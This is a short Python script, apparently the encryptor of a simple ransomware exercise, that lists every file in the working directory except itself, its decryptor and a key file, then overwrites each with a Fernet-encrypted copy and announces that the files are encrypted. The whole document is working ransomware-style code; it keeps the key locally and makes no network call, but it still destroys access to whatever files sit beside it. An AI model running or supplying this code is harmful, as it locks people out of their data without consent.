import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "mod.py" or file == "here_is_the_key.key" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

print(files)

# Check if the key file exists; if not, generate a new key and save it
if not os.path.exists("here_is_the_key.key"):
    key = Fernet.generate_key()
    with open("here_is_the_key.key", "wb") as here_is_the_key:
        here_is_the_key.write(key)
else:
    # If the key file exists, read the key from it
    with open("here_is_the_key.key", "rb") as here_is_the_key:
        key = here_is_the_key.read()

for file in files:
    with open(file, "rb") as File:
        contents = File.read()
    content_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as File:
        File.write(content_encrypted)

print("Your files are encrypted now!")
